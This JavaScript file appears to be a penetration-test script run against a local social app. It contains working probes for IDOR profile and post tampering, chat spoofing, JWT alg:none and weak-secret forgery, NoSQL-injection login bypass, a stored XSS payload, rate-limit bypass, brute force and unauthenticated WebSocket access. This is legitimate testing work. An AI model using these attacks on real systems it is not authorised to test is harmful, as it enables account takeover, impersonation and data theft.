// ============================================================================
//  AUTHORIZED SECURITY ASSESSMENT — malicious user + black-hat perspectives
//  Target: the user's own running system (localhost:8080 -> backend :5000).
//  NO source changes. Every successful finding is recorded.
// ============================================================================
import { createHmac } from 'crypto'

const BASE = 'http://localhost:8080/api/'
const hmac = (data, secret) => createHmac('sha256', secret).update(data).digest('base64url')
const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url')

const findings = []
async function report(name, statusPromise, evidence) {
  const status = await statusPromise
  const ok = status === 'OK' || status === 'WARN'
  const icon = status === 'OK' ? '🔴 FINDING' : status === 'WARN' ? '🟡 WARN' : '🟢 SAFE'
  console.log(`${icon} ${name}`)
  if (evidence) console.log(`        ${String(evidence).slice(0, 300)}`)
  if (ok) findings.push({ name, severity: status, evidence: String(evidence || '').slice(0, 300) })
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const uniq = (p) => `${p}_${Date.now()}_${Math.floor(Math.random() * 1e6)}`

async function req(method, url, { token, body, headers: extra } = {}) {
  const headers = { 'content-type': 'application/json', ...(extra || {}) }
  if (token) headers.authorization = `Bearer ${token}`
  const res = await fetch(BASE + url, { method, headers, body: body ? JSON.stringify(body) : undefined })
  const ct = res.headers.get('content-type') || ''
  const data = ct.includes('json') ? await res.json() : await res.text()
  return { status: res.status, data }
}

function wsProbe(paths, onOpen, waitMs = 5000) {
  return new Promise((resolve) => {
    let got = false
    let ws = null
    let done = false
    const finish = (ok) => { if (done) return; done = true; try { ws && ws.close() } catch { } resolve(ok) }
    for (const url of paths) {
      try {
        ws = new WebSocket(url)
        break
      } catch { ws = null }
    }
    if (!ws) return resolve('SAFE')
    ws.onopen = async () => { try { await onOpen() } catch { } setTimeout(() => finish(got ? 'OK' : 'SAFE'), waitMs) }
    ws.onmessage = () => { got = true }
    ws.onerror = () => finish('SAFE')
    setTimeout(() => finish(got ? 'OK' : 'SAFE'), waitMs + 2000)
  })
}

console.log('==========================================================')
console.log('  PHASE 1 — MALICIOUS USER (abuse / unauthorized access)')
console.log('==========================================================')

// ---- setup: users A (victim), B (malicious), C (bystander) ----
const A = (await req('POST', 'user/signup', { body: { email: uniq('a'), password: 'victim123', firstName: 'Victim', lastName: 'A' } })).data
const B = (await req('POST', 'user/signup', { body: { email: uniq('b'), password: 'attacker123', firstName: 'Attacker', lastName: 'B' } })).data
const C = (await req('POST', 'user/signup', { body: { email: uniq('c'), password: 'bystander123', firstName: 'C' } })).data
const tokenA = A.token, idA = A.result._id
const tokenB = B.token, idB = B.result._id
const tokenC = C.token, idC = C.result._id
const postA = (await req('POST', 'posts', { token: tokenA, body: { title: 'Victim Post', message: 'secret message body' } })).data
const postAId = postA._id

// 1.1
await report('1.1 Password hash disclosure — getUser/:id returns bcrypt hash for ANY user',
  (async () => {
    const r = await req('GET', `user/getUser/${idA}`, { token: tokenB })
    const pwd = r.data?.user?.password
    return pwd && pwd.startsWith('$2a$') ? 'OK' : 'SAFE'
  })(), 'attacker B fetched victim A profile; "password" field contains bcrypt hash')

// 1.2
await report('1.2 Signup email enumeration — duplicate email reveals account existence',
  (async () => {
    const dup = await req('POST', 'user/signup', { body: { email: A.result.email, password: '123456', firstName: 'x' } })
    const fresh = await req('POST', 'user/signup', { body: { email: uniq('fresh'), password: '123456', firstName: 'x' } })
    return dup.status === 400 && fresh.status === 201 ? 'WARN' : 'SAFE'
  })(), `duplicate email -> ${(await req('POST', 'user/signup', { body: { email: A.result.email, password: '123456', firstName: 'x' } })).status} vs new email -> ${(await req('POST', 'user/signup', { body: { email: uniq('fresh'), password: '123456', firstName: 'x' } })).status}`)

// 1.3
await report('1.3 IDOR profile write — B patches A\'s profile by forging _id in body',
  (async () => {
    const r = await req('PATCH', 'user/update', { token: tokenB, body: { _id: idA, name: 'HACKED_BY_B', bio: 'pwned', email: A.result.email, password: A.result.password } })
    const after = await req('GET', `user/getUser/${idA}`, { token: tokenB })
    return r.status === 200 && after.data?.user?.name === 'HACKED_BY_B' ? 'OK' : 'SAFE'
  })(), 'PATCH user/update with victim _id + attacker token; victim name re-read = HACKED_BY_B')

// 1.4
await report('1.4 IDOR post edit — B edits A\'s post',
  (async () => {
    const r = await req('PATCH', `posts/${postAId}`, { token: tokenB, body: { title: 'HACKED TITLE', message: 'x', creator: idA, selectedFile: '' } })
    const after = await req('GET', `posts/${postAId}`, { token: tokenB })
    return r.status === 200 && after.data?.post?.title === 'HACKED TITLE' ? 'OK' : 'SAFE'
  })(), `PATCH posts/${postAId} with B token, title re-read = ${(await req('GET', `posts/${postAId}`, { token: tokenB })).data?.post?.title}`)

// 1.5
await report('1.5 IDOR post delete — B deletes A\'s post',
  (async () => {
    const r = await req('DELETE', `posts/${postAId}`, { token: tokenB })
    return r.status === 200 ? 'OK' : 'SAFE'
  })(), `DELETE posts/${postAId} with B token -> status ${(await req('DELETE', `posts/${postAId}`, { token: tokenB })).status}`)

// 1.6
await report('1.6 Chat cross-user read — C reads A<->B conversation',
  (async () => {
    await req('POST', 'chat/sendmessage', { token: tokenA, body: { content: 'A->B private', sender: idA, receiver: idB } })
    const r = await req('GET', `chat/getmsgsbynums?from=0&firstuid=${idA}&seconduid=${idB}`, { token: tokenC })
    return r.status === 200 && (r.data?.msgs || []).some((m) => String(m.content).includes('A->B private')) ? 'OK' : 'SAFE'
  })(), 'C (not in the conversation) read A<->B message history')

// 1.7
await report('1.7 Chat sender spoof — C sends a message pretending to be A',
  (async () => {
    await req('POST', 'chat/sendmessage', { token: tokenC, body: { content: 'spoofed as A', sender: idA, receiver: idB } })
    const conv = await req('GET', `chat/getmsgsbynums?from=0&firstuid=${idA}&seconduid=${idB}`, { token: tokenB })
    const spoofed = (conv.data?.msgs || []).some((m) => String(m.sender) === String(idA) && String(m.content).includes('spoofed'))
    return spoofed ? 'OK' : 'SAFE'
  })(), 'message with sender=A but token=C stored & shown as coming from A')

// 1.8
await report('1.8 Notification cross-user read — B reads A\'s notifications',
  (async () => {
    const r = await req('GET', `notification/${idA}`, { token: tokenB })
    return r.status === 200 && Array.isArray(r.data?.notifications) ? 'WARN' : 'SAFE'
  })(), 'GET notification/{victimId} with attacker token')

// 1.9
await report('1.9 Mark others\' notifications as read — B marks A\'s as read',
  (async () => {
    const r = await req('PATCH', `notification/mark-notification-as-readed/${idA}`, { token: tokenB })
    return r.status === 200 ? 'WARN' : 'SAFE'
  })(), 'PATCH mark-notification-as-readed/{victimId} with attacker token')

// 1.10
await report('1.10 Signup spam — no rate limit on account creation',
  (async () => {
    let ok = 0
    for (let i = 0; i < 6; i++) { const r = await req('POST', 'user/signup', { body: { email: uniq('spam'), password: '123456', firstName: 'S' } }); if (r.status === 201 || r.status === 200) ok++ }
    return ok === 6 ? 'WARN' : 'SAFE'
  })(), '6 rapid signups, all accepted (no throttling)')

// 1.11
await report('1.11 Post spam — no rate limit on post creation',
  (async () => {
    let ok = 0
    const ids = []
    for (let i = 0; i < 15; i++) { const r = await req('POST', 'posts', { token: tokenB, body: { title: 'spam', message: 'x' } }); if (r.status === 201) { ok++; ids.push(r.data._id) } }
    for (const id of ids) await req('DELETE', `posts/${id}`, { token: tokenB })
    return ok === 15 ? 'WARN' : 'SAFE'
  })(), '15 rapid post creations, all accepted')

console.log('')
console.log('==========================================================')
console.log('  PHASE 2 — BLACK-HAT HACKER (auth bypass & injection)')
console.log('==========================================================')

const decoded = JSON.parse(Buffer.from(A.token.split('.')[1], 'base64url').toString())
console.log('  JWT payload claims:', Object.keys(decoded).join(','), '| alg:', JSON.parse(Buffer.from(A.token.split('.')[0], 'base64url').toString()).alg)

// 2.1
await report('2.1 JWT alg:none — forged token accepted',
  (async () => {
    const forged = `${b64url({ alg: 'none', typ: 'JWT' })}.${b64url({ ...decoded, _id: idB })}.`
    return (await req('GET', `user/getUser/${idB}`, { token: forged })).status === 200 ? 'OK' : 'SAFE'
  })(), 'token with alg:none and empty signature')

// 2.2
const COMMON_SECRETS = ['', 'secret', 'secretkey', 'secret_key', 'your-secret-key', 'your_jwt_secret', 'jwt-secret', 'jwtsecret', 'mysecret', 'supersecret', 'super-secret', 'realworld', 'RealWorld', 'socialapp', 'golang', 'golangserver', 'Server', 'server', '123456', 'password', 'key', 'token', 'test', 'dev', 'development', 'production']
let crackedSecret = null
for (const s of COMMON_SECRETS) {
  const header = b64url({ alg: 'HS256', typ: 'JWT' })
  const payload = b64url({ ...decoded, _id: idB })
  const forged = `${header}.${payload}.${hmac(header + '.' + payload, s)}`
  if ((await req('GET', `user/getUser/${idB}`, { token: forged })).status === 200) { crackedSecret = s; break }
}
await report('2.2 JWT weak/hardcoded secret — token forged with common secret accepted',
  (async () => crackedSecret !== null ? 'OK' : 'SAFE')(),
  crackedSecret !== null ? `cracked with secret="${crackedSecret}"` : 'none of the common secrets worked')

// 2.3
await report('2.3 Expired token acceptance',
  (async () => {
    if (!crackedSecret) return 'SAFE'
    const header = b64url({ alg: 'HS256', typ: 'JWT' })
    const payload = b64url({ ...decoded, _id: idB, exp: Math.floor(Date.now() / 1000) - 3600 })
    const forged = `${header}.${payload}.${hmac(header + '.' + payload, crackedSecret)}`
    return (await req('GET', `user/getUser/${idB}`, { token: forged })).status === 200 ? 'OK' : 'SAFE'
  })(), 'token with exp in the past (requires cracked secret)')

// 2.4
await report('2.4 NoSQL injection (MongoDB operators) in signin — login as any user',
  (async () => {
    const r = await req('POST', 'user/signin', { body: { email: { $ne: null }, password: { $ne: null } } })
    return r.status === 200 && r.data?.token ? 'OK' : 'SAFE'
  })(), 'signin with {"email":{"$ne":null},"password":{"$ne":null}}')

// 2.5
await report('2.5 NoSQL injection in query params (operator nesting)',
  (async () => {
    const r = await req('GET', `posts?id[$ne]=x`, { token: tokenB })
    return r.status === 200 ? 'WARN' : 'SAFE'
  })(), 'GET posts?id[$ne]=x — filter object interpreted?')

// 2.6
await report('2.6 Stored XSS payload — accepted & returned unsanitized by the API',
  (async () => {
    const payload = '<img src=x onerror=alert(1)><script>alert(2)</script>'
    const p = (await req('POST', 'posts', { token: tokenB, body: { title: 'XSS probe', message: payload } })).data
    const read = (await req('GET', `posts/${p._id}`, { token: tokenB })).data?.post
    const raw = read?.message || ''
    if (p._id) await req('DELETE', `posts/${p._id}`, { token: tokenB })
    return raw.includes('<img') && raw.includes('<script>') ? 'WARN' : 'SAFE'
  })(), 'API stores & returns raw HTML payload (client-side escaping is the only defense)')

// 2.7
await report('2.7 Public feed & search without authentication',
  (async () => {
    const r1 = await req('GET', `posts?id=${idA}&page=1`)
    const r2 = await req('GET', 'posts/search?searchQuery=test')
    return r1.status === 200 || r2.status === 200 ? 'WARN' : 'SAFE'
  })(), `posts w/o token -> ${(await req('GET', `posts?id=${idA}&page=1`)).status}, search w/o token -> ${(await req('GET', 'posts/search?searchQuery=test')).status}`)

// 2.8
await report('2.8 Rate-limit bypass via X-Forwarded-For spoofing',
  (async () => {
    let ok = 0, t429 = 0
    for (let i = 0; i < 40; i++) {
      const r = await req('GET', `user/getUser/${idB}`, { token: tokenB, headers: { 'x-forwarded-for': `10.0.0.${i}` } })
      if (r.status === 200) ok++; else if (r.status === 429) t429++
    }
    return t429 === 0 ? 'OK' : 'SAFE'
  })(), '40 getUser calls each with unique X-Forwarded-For')

// 2.9
await report('2.9 Login brute-force — no rate limit / lockout on signin',
  (async () => {
    let t401 = 0
    for (let i = 0; i < 12; i++) {
      const r = await req('POST', 'user/signin', { body: { email: A.result.email, password: `wrong${i}` } })
      if (r.status === 401 || r.status === 400) t401++
    }
    return t401 === 12 ? 'WARN' : 'SAFE'
  })(), '12 rapid wrong-password attempts, none throttled')

// 2.10
await report('2.10 Mass assignment on createPost — forge creator attribution',
  (async () => {
    const p = (await req('POST', 'posts', { token: tokenC, body: { title: 'spoof creator', message: 'x', creator: idA } })).data
    const r = await req('GET', `posts/${p._id}`, { token: tokenC })
    const creator = r.data?.post?.creator
    if (p._id) await req('DELETE', `posts/${p._id}`, { token: tokenC })
    return String(creator) === String(idA) ? 'OK' : 'SAFE'
  })(), 'post created with token=C but body creator=A')

console.log('')
console.log('==========================================================')
console.log('  PHASE 3 — WEBSOCKET AUTHENTICATION')
console.log('==========================================================')

// 3.1
await report('3.1 Notification WebSocket without any token — connect to victim path',
  wsProbe([`ws://localhost:8080/ws-notify/${idA}`, `ws://localhost:8088/ws-notify/${idA}`], async () => {
    await req('PATCH', `user/${idA}/following`, { token: tokenB })
  }),
  'connected to /ws-notify/{victimId} with NO auth; B follows A to generate a notification')

// 3.2
await report('3.2 Chat WebSocket without any token — connect to victim path',
  wsProbe([`ws://localhost:8080/ws-chat/${idA}`, `ws://localhost:8001/ws-chat/${idA}`], async () => {
    await req('POST', 'chat/sendmessage', { token: tokenC, body: { content: 'ws probe', sender: idC, receiver: idA } })
  }),
  'connected to /ws-chat/{victimId} with NO auth and observed incoming events')

console.log('')
console.log('==========================================================')
console.log(`  ASSESSMENT COMPLETE — ${findings.length} SUCCESSFUL FINDING(S)`)
console.log('==========================================================')
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.severity}] ${f.name}${f.evidence ? '  -> ' + f.evidence : ''}`))
